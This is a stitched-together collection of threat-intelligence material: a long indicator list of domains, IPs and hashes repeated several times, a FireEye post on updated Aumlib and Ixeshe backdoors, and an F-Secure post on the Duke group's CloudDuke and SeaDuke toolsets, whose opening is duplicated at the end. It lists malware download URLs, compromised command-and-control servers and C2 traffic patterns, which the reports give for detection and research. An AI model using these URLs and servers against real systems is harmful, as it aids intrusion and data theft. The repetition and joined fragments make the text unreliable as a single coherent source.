ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.osk.lflink.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.lucy.justdied.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.reg.dsmtp.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.lucy.justdied.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.osk.lflink.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.lucy.justdied.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domain .
Survival of the Fittest : New York Times Attackers Evolve Quickly .
The attackers behind the breach of the New York Times ’ computer network late last year appear to be mounting fresh assaults that leverage new and improved versions of malware .
The new campaigns mark the first significant stirrings from the group since it went silent in January in the wake of a detailed expose of the group and its exploits — and a retooling of what security researchers believe is a massive spying operation based in China .
[ 1 ] .
The newest campaign uses updated versions of Aumlib and Ixeshe .
Aumlib , which for years has been used in targeted attacks , now encodes certain HTTP communications .
FireEye researchers spotted the malware when analyzing a recent attempted attack on an organization involved in shaping economic policy .
And a new version of Ixeshe , which has been in service since 2009 to attack targets in East Asia , uses new network traffic patterns , possibly to evade traditional network security systems .
The updates are significant for both of the longstanding malware families ; before this year , Aumlib had not changed since at least May 2011 , and Ixeshe had not evolved since at least December 2011 .
BACKGROUND .
Cybercriminals are constantly evolving and adapting in their attempts to bypass computer network defenses .
But , larger , more successful threat actors tend to evolve at a slower rate .
As long as these actors regularly achieve their objective ( stealing sensitive data ) , they are not motivated to update or rethink their techniques , tactics , or procedures ( TTPs ) .
These threat actors ’ tactics follow the same principles of evolution – successful techniques propagate , and unsuccessful ones are abandoned .
Attackers do not change their approach unless an external force or environmental shift compels them to .
As the old saying goes : If it ain ’ t broke , don ’ t fix it .
So when a larger , successful threat actor changes up tactics , the move always piques our attention .
Naturally , our first priority is ensuring that we detect the new or altered TTPs .
But we also attempt to figure out why the adversary changed — what broke ? — so that we can predict if and when they will change again in the future .
We observed an example of this phenomenon around May .
About four months after The New York Times publicized an attack on its network , the attackers behind the intrusion deployed updated versions of their Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families .
[ 2 ] .
The previous versions of Aumlib had not changed since at least May 2011 , and Ixeshe had not evolved since at least December 2011 .
We can not say for sure whether the attackers were responding to the scrutiny they received in the wake of the episode .
But we do know the change was sudden .
Akin to turning a battleship , retooling TTPs of large threat actors is formidable .
Such a move requires recoding malware , updating infrastructure , and possibly retraining workers on new processes .
The following sections detail the changes to Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe .
Backdoor.APT.Aumlib .
Aumlib has been used in targeted attacks for years .
Older variants of this malware family generated the following POST request :
POST /bbs/info.asp HTTP/1.1 .
Data sent via this POST request transmitted in clear text in the following structure :
< VICTIM BIOS NAME > | < CAMPAIGN ID > | < VICTIM EXTERNAL IP > | < VICTIM OS > | .
A recently observed malware sample ( hash value 832f5e01be536da71d5b3f7e41938cfb ) appears to be a modified variant of Aumlib .
The sample , which was deployed against an organization involved in shaping economic policy , was downloaded from the following URL :
status.acmetoy.com/DD/myScript.js or status.acmetoy.com/DD/css.css .
The sample generated the following traffic :
This output reveals the following changes when compared with earlier variants : The POST URI is changed to /bbs/search.asp ( as mentioned , earlier Aumlib variants used a POST URI of /bbs/info.asp . ) The POST body is now encoded .
Additional requests from the sample generated the following traffic :
These subtle changes may be enough to circumvent existing IDS signatures designed to detect older variants of the Aumlib family .
The sample 832f5e01be536da71d5b3f7e41938cfb shares code with an older Aumlib variant with the hash cb3dcde34fd9ff0e19381d99b02f9692 .
The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to documents.myPicture.info and www.documents.myPicture.info and as expected generated the a POST request to /bbs/info.asp .
Backdoor.APT.Ixeshe .
Ixeshe has been used in targeted attacks since 2009 , often against entities in East Asia .
[ 3 ] .
Although the network traffic is encoded with a custom Base64 alphabet , the URI pattern has been largely consistent :
/ [ ACD ] [ EW ] S [ Numbers ] .jsp ? [ Base64 ] .
We analyzed a recent sample that appears to have targeted entities in Taiwan , a target consistent with previous Ixeshe activity .
This sample ( aa873ed803ca800ce92a39d9a683c644 ) exhibited network traffic that does not match the earlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe related infections .
The Base64-encoded data still contains information including the victim ’ s hostname and IP address but also a “ mark ” or “ campaign tag/code ” that the threat actors use to keep track of their various attacks .
The mark for this particular attack was [ ll65 ] .
CONCLUSION .
Based on our observations , the most successful threat actors evolve slowly and deliberately .
So when they do change , pay close attention .
Knowing how attackers ’ strategy is shifting is crucial to detecting and defending against today ’ s advanced threats .
But knowing the “ why ” is equally important .
That additional degree of understanding can help organizations forecast when and how a threat actor might change their behavior — because if you successfully foil their attacks , they probably will .
Notes [ 1 ] http : //www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times computers.html ? pagewanted=all [ 2 ] This actor is known as APT12 by Mandiant [ 3 ] http : //www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white papers/wp_ixeshe.pdf .
This entry was posted in Threat Intelligence , Threat Research by Ned Moran and Nart Villeneuve .
Bookmark the permalink .
Duke APT group 's latest tools : cloud services and Linux support F Secure Weblog : News from the Lab .
Recent weeks have seen the outing of two new additions to the Duke group 's toolset , SeaDuke and CloudDuke .
Of these , SeaDuke is a simple trojan made interesting by the fact that it 's written in Python .
And even more curiously , SeaDuke , with its built-in support for both Windows and Linux , is the first cross-platform malware we have observed from the Duke group .
While SeaDuke is a single albeit cross platform trojan , CloudDuke appears to be an entire toolset of malware components , or `` solutions '' as the Duke group apparently calls them .
These components include a unique loader , downloader , and not one but two different trojan components .
CloudDuke also greatly expands on the Duke group 's usage of cloud storage services , specifically Microsoft 's OneDrive , as a channel for both command and control as well as the exfiltration of stolen data .
Finally , some of the recent CloudDuke spear-phishing campaigns have born a striking resemblance to CozyDuke spear-phishing campaigns from a year ago .
Linux support added with the cross-platform SeaDuke malware .
Last week , both Symantec and Palo Alto Networks published research on SeaDuke , a newer addition to the arsenal of trojans being used by the Duke group .
While older malware by the Duke group has always been written with a combination of the C and C++ programming languages as well as assembly language , SeaDuke is peculiarly written in Python with multiple layers of obfuscation .
This Python code is usually then compiled into Windows executables using py2exe or pyinstaller .
However , the Python code itself has been designed to work on both Windows and Linux .
We therefore suspect , that the Duke group is also using the same SeaDuke Python code to target Linux victims .
This is the first time we have seen the Duke group employ malware to target Linux platforms .
An example of the cross-platform support found in SeaDuke .
A new set of solutions with the CloudDuke malware toolset .
Last week , we also saw Palo Alto Networks and Kaspersky Labs publish research on malware components they respectively called MiniDionis and CloudLook .
MiniDionis and CloudLook are both components of a larger malware toolset we call CloudDuke .
This toolset consists of malware components that provide varying functionality while partially relying on a shared code framework and always using the same loader .
Based on PDB strings found in the samples , the malware authors refer to the CloudDuke components as `` solutions '' with names such as `` DropperSolution '' , `` BastionSolution '' and `` OneDriveSolution '' .
A list of PDB strings we have observed is below :
• C : \DropperSolution\Droppers\Projects\Drop_v2\Release\Drop_v2.pdb • c : \BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb • c : \BastionSolution\Shells\Projects\miniDionis2\miniDionis\obj\Release\miniDionis.pdb • c : \OneDriveSolution\Shells\Projects\OneDrive2\OneDrive\obj\x64\Release\OneDrive.pdb .
The first of the CloudDuke components we have observed is a downloader internally called `` DropperSolution '' .
The purpose of the downloader is to download and execute additional malware on the victim 's system .
In most observed cases , the downloader will attempt to connect to a compromised website to download an encrypted malicious payload which the downloader will decrypt and execute .
Depending on the way the downloader has been configured , in some cases it may first attempt to log in to Microsoft 's cloud storage service OneDrive and retrieve the payload from there .
If no payload is available from OneDrive , the downloader will revert to the previously mentioned method of downloading from compromised websites .
We have also observed two distinct trojan components in the CloudDuke toolset .
The first of these , internally called `` BastionSolution '' , is the trojan that Palo Alto Networks described in their research into `` MiniDionis '' .
Interestingly , BastionSolution appears to functionally be an exact copy of SeaDuke with the only real difference being the choice of programming language .
BastionSolution also makes significant use of a code framework that is apparently internally called `` Z '' .
This framework provides classes for functionality such as encryption , compression , randomization and network communications .
A list of classes in the BastionSolution trojan , including multiple classes from the `` Z '' framework .
Classes from the same `` Z '' framework , such as the encryption and randomization classes , are also used by the second trojan component of the CloudDuke toolset .
This second component , internally called `` OneDriveSolution '' , is especially interesting because it relies on Microsoft 's cloud storage service OneDrive as its command and control channel .
To achieve this , OneDriveSolution will attempt to log into OneDrive with a preconfigured username and password .
If successful , OneDriveSolution will then proceed to copy data from the victim 's computer to the OneDrive account .
It will also search the OneDrive account for files containing commands for the malware to execute .
A list of classes in the OneDriveSolution trojan , including multiple classes from the `` Z '' framework .
All of the CloudDuke `` solutions '' use the same loader , a piece of code whose primary purpose is to decrypt the embedded , encrypted solution , load it in memory and execute it .
The Duke group has often employed loaders for their malware but unlike the previous loaders they have used , the CloudDuke loader is much more versatile with support for multiple methods of loading and executing the final payload as well as the ability to write to disk and execute additional malware components .
CloudDuke spear-phishing campaigns and similarities with CozyDuke CloudDuke has recently been spread via spear-phishing emails with targets reportedly including organizations such as the US Department of Defense .
These spear-phising emails have contained links to compromised websites hosting zip archives that contain CloudDuke-laden executables .
In most cases , executing these executables will have resulted in two additional files being written to the victim 's hard disk .
The first of these files has been a decoy , such as an audio file or a PDF file while the second one has been a CloudDuke loader embedding a CloudDuke downloader , the so-called `` DropperSolution '' .
In these cases , the victim has been presented with the decoy file while in the background the downloader has proceeded to download and execute one of the CloudDuke trojans , `` OneDriveSolution '' or `` BastionSolution '' .
Example of one of the decoy documents employed in the CloudDuke spear-phishing campaigns .
It has apparently been copied by the attackers from here .
Interestingly , however , some of the other CloudDuke spear-phishing campaigns we have observed this July have born a striking resemblance to CozyDuke spear-phishing campaigns seen almost exactly a year ago , in the beginning of July 2014 .
In both spear-phishing campaigns , the decoy document has been the exact same PDF file , a `` US letter fax test page '' ( 28d29c702fdf3c16f27b33f3e32687dd82185e8b ) .
Similarly , the URLs hosting the malicious files have , in both campaigns , purported to be related to eFaxes .
It is also interesting to note , that in the case of the CozyDuke-inspired CloudDuke spear-phishing campaign , the downloading and execution of the malicious archive linked to in the emails has not resulted in the execution of the CloudDuke downloader but in the execution of the `` BastionSolution '' component thereby skipping one step from the process described for the other CloudDuke spear-phishing campaigns .
The `` US letter fax test page '' decoy employed in both CloudDuke and CozyDuke spear-phishing campaigns .
Increasingly using cloud services to evade detection < /heading .
CloudDuke is not the first time we have observed the Duke group use cloud services in general and Microsoft OneDrive specifically as part of their operations .
Earlier this spring we released research on CozyDuke where we mentioned observing CozyDuke sometimes either directly use a OneDrive account to exfiltrate stolen data or alternatively CozyDuke downloading Visual Basic scripts that would copy stolen files to a OneDrive account and sometimes even retrieve files containing additional commands from the same OneDrive account .
In these previous cases the Duke group has only used OneDrive as a secondary communication channel but still relied on more traditional C & C channels for most of their actions .
It is therefore interesting to note that CloudDuke actually enables the Duke group to rely solely on OneDrive for every step of their operation from downloading the actual trojan , passing commands to the trojan and finally exfiltrating stolen data .
By relying solely on 3rd party web services , such as OneDrive , as their command and control channel , we believe the Duke group is trying to better evade detection .
Large amounts of data being transferred from an organization 's network to an unknown web server easily raises suspicions .
However , data being transferred to a popular cloud storage service is normal .
What better way for an attacker to surreptitiously transfer large amounts of stolen data than the same way people are transferring that same data every day for legitimate reasons .
( Coincidentally , the implications of 3rd party web services being used as command and control channels is also the subject of an upcoming talk at the VirusBulletin 2015 conference ) .
Directing limited resources towards evading detection and staying ahead of defenders .
Developing even a single multipurpose malware toolset , never mind many , requires time and resources .
Therefore it seems logical to attempt to reuse code such as supporting frameworks between different toolsets .
The Duke group , however , appear to have taken this a step further with SeaDuke and the CloudDuke component BastionSolution , by rewriting the same code in multiple programming languages .
This has the obvious benefits of saving time and resources by providing two malware toolsets , that while similar on the inside , appear completely different on the outside .
This way , the discovery of one toolset does not immediately lead to the discovery of the second toolset .
The Duke group , long suspected of ties to the Russian state , have been running their espionage operation for an unusually long time and especially lately with unusual brazenness .
These latest CloudDuke and SeaDuke campaigns appear to be a clear sign that the Duke 's are not planning to stop any time soon .
Research and post by Artturi ( @ lehtior2 ) F-Secure detects CloudDuke as Trojan : W32/CloudDuke.B and Trojan : W64/CloudDuke.B Samples :
04299c0b549d4a46154e0a754dda2bc9e43dff76 2f53bfcd2016d506674d0a05852318f9e8188ee1 317bde14307d8777d613280546f47dd0ce54f95b 476099ea132bf16fa96a5f618cb44f87446e3b02 4800d67ea326e6d037198abd3d95f4ed59449313 52d44e936388b77a0afdb21b099cf83ed6cbaa6f 6a3c2ad9919ad09ef6cdffc80940286814a0aa2c 78fbdfa6ba2b1e3c8537be48d9efc0c47f417f3c 9f5b46ee0591d3f942ccaa9c950a8bff94aa7a0f bfe26837da22f21451f0416aa9d241f98ff1c0f8 c16529dbc2987be3ac628b9b413106e5749999ed cc15924d37e36060faa405e5fa8f6ca15a3cace2 dea6e89e36cf5a4a216e324983cc0b8f6c58eaa8 e33e6346da14931735e73f544949a57377c6b4a0 ed0cf362c0a9de96ce49c841aa55997b4777b326 f54f4e46f5f933a96650ca5123a4c41e115a9f61 f97c5e8d018207b1d546501fe2036adfbf774cfd .
Compromised servers used for command and control :
http://cognimuse.cs.ntua.gr/search.php http://portal.sbn.co.th/rss.php http://97.75.120.45/news/archive.php http://portal.sbn.co.th/rss.php http://58.80.109.59/plugins/search.php .
Compromised websites used to host CloudDuke :
http://flockfilmseries.com/eFax/incoming/5442.ZIP http://www.recordsmanagementservices.com/eFax/incoming/150721/5442.ZIP http://files.counseling.org/eFax/incoming/150721/5442.ZIP .
Page 1 .
Duke APT group 's latest tools : cloud services and Linux support F Secure Weblog : News from the Lab .
Recent weeks have seen the outing of two new additions to the Duke group 's toolset , SeaDuke and CloudDuke .
Of these , SeaDuke is a simple trojan made interesting by the fact that it 's written in Python .
And even more curiously , SeaDuke , with its built-in support for both Windows and Linux , is the first cross-platform malware we have observed from the Duke group .
While SeaDuke is a single albeit cross platform trojan , CloudDuke appears to be an entire toolset of malware components , or `` solutions '' as the Duke group apparently calls them .
These components include a unique loader , downloader , and not one but two different trojan components .
CloudDuke also greatly expands on the Duke group 's usage of cloud storage services , specifically Microsoft 's OneDrive , as a channel for both command and control as well as the exfiltration of stolen data .
Finally , some of the recent CloudDuke spear-phishing campaigns have born a striking resemblance to CozyDuke spear-phishing campaigns from a year ago .
Linux support added with the cross-platform SeaDuke malware .
Last week , both Symantec and Palo Alto Networks published research on SeaDuke , a newer addition to the arsenal of trojans being used by the Duke group .
While older malware by the Duke group has always been written with a combination of the C and C++ programming languages as well as assembly language , SeaDuke is peculiarly written in Python with multiple layers of obfuscation .
This Python code is usually then compiled into Windows executables using py2exe or pyinstaller .
However , the Python code itself has been designed to work on both Windows and Linux .
We therefore suspect , that the Duke group is also using the same SeaDuke Python code to target Linux victims .
This is the first time we have seen the Duke group employ malware to target Linux platforms .
An example of the cross-platform support found in SeaDuke .
A new set of solutions with the CloudDuke malware toolset .
Last week , we also saw Palo Alto Networks and Kaspersky Labs publish research on malware components they respectively called MiniDionis and CloudLook .
MiniDionis and CloudLook are both components of a larger malware toolset we call CloudDuke .
This toolset consists of malware components that provide varying functionality while partially relying on a shared code framework and always using the same loader .
Based on PDB strings found in the samples , the malware authors refer to the CloudDuke components as `` solutions '' with names such as `` DropperSolution '' , `` BastionSolution '' and `` OneDriveSolution '' .
A list of PDB strings we have observed is below :
• C : \DropperSolution\Droppers\Projects\Drop_v2\Release\Drop_v2.pdb • c : \BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb • c : \BastionSolution\Shells\Projects\miniDionis2\miniDionis\obj\Release\miniDionis.pdb • c : \OneDriveSolution\Shells\Projects\OneDrive2\OneDrive\obj\x64\Release\OneDrive.pdb .
The first of the CloudDuke components we have observed is a downloader internally called `` DropperSolution '' .
The purpose of the downloader is to download and execute additional malware on the victim 's system .
In most observed cases , the downloader will attempt to connect to a compromised website to download an encrypted malicious payload which the downloader will decrypt and execute .
Depending on the way the downloader has been configured , in some cases it may first attempt to log in to Microsoft 's cloud storage service OneDrive and retrieve the payload from there .
If no payload is available from OneDrive , the downloader will revert to the previously mentioned method of downloading from compromised websites .
